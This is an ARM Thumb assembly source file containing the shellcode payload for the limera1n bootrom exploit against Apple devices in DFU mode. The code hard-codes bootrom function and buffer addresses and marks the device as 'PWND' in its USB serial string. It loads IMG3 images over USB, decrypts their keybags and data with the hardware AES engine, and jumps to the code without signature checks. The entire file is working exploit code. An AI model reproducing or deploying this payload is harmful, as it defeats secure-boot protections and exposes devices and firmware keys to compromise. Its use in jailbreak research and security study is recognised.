@ limera1n-shellcode.S
@ Author: npupyshev
@ Shellcode for limera1n exploit with minor improvements:
@ * reports PWND:[limera1n] in USB serial number string

.text
 
.pool
.set free,                          0x3b95
.set memmove,                       0x84dc
.set strlcat,                       0x90c9

.set usb_wait_for_image,            0x4c85
.set jump_to,                       0x5a5d

.set image3_load_create_object,     0x412d
.set image3_load_verify_tag,        0x442d
.set image3_load_get_tag_data,      0x405d
.set aes_crypto_cmd,                0x686d

.set gLeakingDFUBuffer,             0x8402dbcc
.set gUSBSerialNumber,              0x8402e0e0

.set RELOCATE_SHELLCODE_ADDRESS,    0x84039800
.set RELOCATE_SHELLCODE_SIZE,       0x200
.set MAIN_STACK_ADDRESS,            0x8403c000
.set LOAD_ADDRESS,                  0x84000000
.set MAX_SIZE,                      0x2c000

.global _start

_start:
.code 16
    B   relocate_shellcode                      @ goto relocate_shellcode

    NOP
    NOP
    NOP
    NOP                                         
    NOP                                         
    NOP                                         
    NOP
    NOP
    NOP

relocate_shellcode:
    MOV R1, PC
    SUB R1, #4                              @ R1 = PC - 4

    LDR R0, =RELOCATE_SHELLCODE_ADDRESS
    CMP R0, R1
    BEQ pwned_dfu_start                         @ if (R1 == RELOCATE_SHELLCODE_ADDRESS) goto pwned_dfu_start

    LDR R2, =RELOCATE_SHELLCODE_SIZE            @ R2 = RELOCATE_SHELLCODE_SIZE
    LDR R3, =memmove
    BLX R3                                      @ memmove(RELOCATE_SHELLCODE_ADDRESS, R1, RELOCATE_SHELLCODE_SIZE)

    LDR R3, =RELOCATE_SHELLCODE_ADDRESS
    ADD R3, #1
    BX R3                                       @ goto (RELOCATE_SHELLCODE_ADDRESS + 1)

pwned_dfu_start:
    LDR R0, =MAIN_STACK_ADDRESS
    MOV SP, R0                                  @ SP = MAIN_STACK_ADDRESS
	
    LDR R0, =gUSBSerialNumber
    ADR R1, PWND_STRING
    MOV R2, #120
    LDR R3, =strlcat
    BLX R3                                      @ strlcat(gUSBSerialNumber, PWND_STRING, 120)
	
pwned_dfu_loop:
    LDR R3, =usb_wait_for_image
    LDR R0, =LOAD_ADDRESS
    LDR R1, =MAX_SIZE
    BLX R3                                      @ R0 = usb_wait_for_image(LOAD_ADDRESS, MAX_SIZE)

    MOV R4, R0                                  @ R4 = R0

    LDR R1, =gLeakingDFUBuffer
	LDR R0, [R1]

    MOV R2, #0
    STR R2, [R1]                                @ gLeakingDFUBuffer = 0

    LDR R3, =free
    BLX R3                                      @ free(R0)

    CMP R4, #0
    BLT pwned_dfu_loop                          @ if (R4 < 0) goto pwned_dfu_loop

    LDR R5, =LOAD_ADDRESS
    LDR R0, [R5]                                @ R0 = LOAD_ADDRESS[0]


image3_load:
	@ SP + 0x00 = &arg5
	@ SP + 0x04 = &arg6
	@ SP + 0x08 = &arg7
	@ SP + 0x0C = &objectHandle
	@ SP + 0x10 = &dataAddress
	@ SP + 0x14 = &dataLength
	@ SP + 0x18 = &iv[16]
	@ SP + 0x28 = &key[32]

	SUB SP, #0x48

	@ ret = image3_load_create_object(&objectHandle, LOAD_ADDRESS, MAX_SIZE, false);
	MOV R0, SP
	ADD R0, #0xC                                @ arg1 = &objectHandle
	MOV R1, R5                                  @ arg2 = LOAD_ADDRESS
	LDR R2, =MAX_SIZE                           @ arg3 = MAX_SIZE
	MOV R3, #0                                  @ arg4 = false (no copy)
	LDR R4, =image3_load_create_object
	BLX R4

	@ if (ret != 0) goto image3_load_fail;
	CMP R0, #0
	BNE image3_load_fail

	@ ret = image3_load_get_tag_data(objectHandle, 'DATA', &dataAddress, &dataLength, 0);
	STR R0, [SP]                                @ arg5 = 0
	STR R0, [SP, #0x14]                         @ dataLength = 0
	LDR R0, [SP, #0xC]                          @ arg1 = objectHandle
	LDR R1, =0x44415441                         @ arg2 = 'DATA'
	MOV R2, SP
	ADD R2, #0x10                               @ arg3 = &dataAddress
	ADD R3, R2, #0x4                            @ arg4 = &dataLength
	LDR R4, =image3_load_get_tag_data
	BLX R4

	@ if (ret != 0) goto image3_load_fail;
	CMP R0, #0
	BNE image3_load_fail

	@ prepare image3_load_get_tag_data pointer
	LDR R4, =image3_load_get_tag_data
	MOV R6, #0                                  @ i = 0
	
image3_load_kbag_loop:
	MOV R0, #56
	STR R0, [SP, #0x08]                         @ max size for KBAG
	
	@ image3_load_get_tag_data(objectHandle, 'KBAG', &arg6, &arg7);
	LDR R0, [SP, #0xC]                          @ arg1 = objectHandle
	LDR R1, =0x4b424147                         @ arg2 = 'KBAG'
	ADD R2, SP, #0x04                           @ arg3 = &arg6 (store keybag address in arg6)
	ADD R3, R2, #0x04                           @ arg4 = &arg7 (store keybag size in arg7)
	STR R6, [SP]                                @ arg5 = i
	BLX R4

	CMP R0, #0
	BNE image3_load_copy_data
	
	@ if (keybagLength < MIN_IMG3_KBAG_SIZE) goto image3_load_fail;
	LDR R0, [SP, #0x08]                         @ R0 = keybagLength
	CMP R0, #40                                 @ cryptState + keyLength + iv + AES 128 key
	BLT image3_load_fail
	
	@ if (cryptState != 1) continue;
	LDR R1, [SP, #0x04]                         @ R1 = keybagAddr
	LDR R2, [R1]                                @ R2 = cryptState
	CMP R2, #1
	BNE image3_load_kbag_loop
	
	@ if (keySizeBits / 8 + 24 > keybagLength) goto image3_load_fail;
	LDR R2, [R1, #0x04]                         @ R2 = keySizeBits
	LSR R3, R2, #3
	ADD R3, #24                                 @ R3 = keySizeBits / 8 + sizeof(uint32_t) + sizeof(uint32_t) + sizeof(iv)
	CMP R3, R0
	BGT image3_load_fail
	
	CMP R3, #56
	BEQ image3_load_kbag_key_256
	CMP R3, #48
	BEQ image3_load_kbag_key_192
	CMP R3, #40
	BEQ image3_load_kbag_key_128
	B image3_load_fail
	
image3_load_kbag_key_256:
	MOV R7, #0x1
	LSL R7, R7, #29
	B image3_load_kbag_key_ok
image3_load_kbag_key_192:
	MOV R7, #0x1
	LSL R7, R7, #28
	B image3_load_kbag_key_ok
image3_load_kbag_key_128:
	MOV R7, #0

image3_load_kbag_key_ok:
	@ memmove(&iv, &keybag->iv, sizeof(iv) + keySizeBits / 8);
	MOV R0, SP
	ADD R0, #0x18                               @ arg1 = &iv
	ADD R1, #8                                  @ arg2 = &keybag->iv
	SUB R3, #8
	MOV R2, R3                                  @ arg3 = keySizeBits / 8 + sizeof(iv)
	MOV R6, R2
	LDR R4, =memmove
	BLX R4
	
	@ aes_crypto_cmd(17, &iv, &iv, sizeof(iv) + keySizeBits / 8, 0x20000200, NULL, NULL);
	MOV R0, #17                                 @ arg1 = 17
	MOV R1, SP
	ADD R1, #0x18                               @ arg2 = &iv
	MOV R2, R1                                  @ arg3 = &iv
	MOV R3, R6                                  @ arg4 = sizeof(iv) + keySizeBits / 8
	LDR R4, =0x20000200
	STR R4, [SP]                                @ arg5 = 0x20000200
	MOV R4, #0
	STR R4, [SP, #4]                            @ arg6 = 0
	STR R4, [SP, #8]                            @ arg7 = 0
	LDR R4, =aes_crypto_cmd
	BLX R4

	@ aes_crypto_cmd(17, dataAddress, dataAddress, dataLength, enc_flags, key, iv);
	MOV R0, #17                                 @ arg1 = 17
	LDR R1, [SP, #0x10]                         @ arg2 = dataAddress
	MOV R2, R1                                  @ arg3 = dataAddress
	LDR R3, [SP, #0x14]                         @ arg4 = dataLength
	STR R7, [SP]                                @ arg5 = enc_flags
	MOV R7, SP
	ADD R7, #0x28
	STR R7, [SP, #4]                            @ arg6 = key
	SUB R7, #0x10
	STR R7, [SP, #8]                            @ arg7 = iv
	BLX R4

image3_load_copy_data:
	@ memmove(LOAD_ADDRESS, dataAddress, dataLength);
	LDR R0, =LOAD_ADDRESS                       @ arg1 = LOAD_ADDRESS
	LDR R1, [SP, #0x10]                         @ arg2 = dataAddress
	LDR R2, [SP, #0x14]                         @ arg3 = dataLength
	MOV R5, R0
	LDR R4, =memmove
	BLX R4

	@ jump_to(0, LOAD_ADDRESS, 0);
	MOV R0, #0                                  @ arg1 = 0
	MOV R1, R5                                  @ arg2 = LOAD_ADDRESS
	MOV R2, #0                                  @ arg3 = 0
	LDR R4, =jump_to
	BLX R4

image3_load_fail:
	ADD SP, SP, #0x48
	B pwned_dfu_loop

.align 2

PWND_STRING:
.ascii " PWND:[limera1n]\x00"
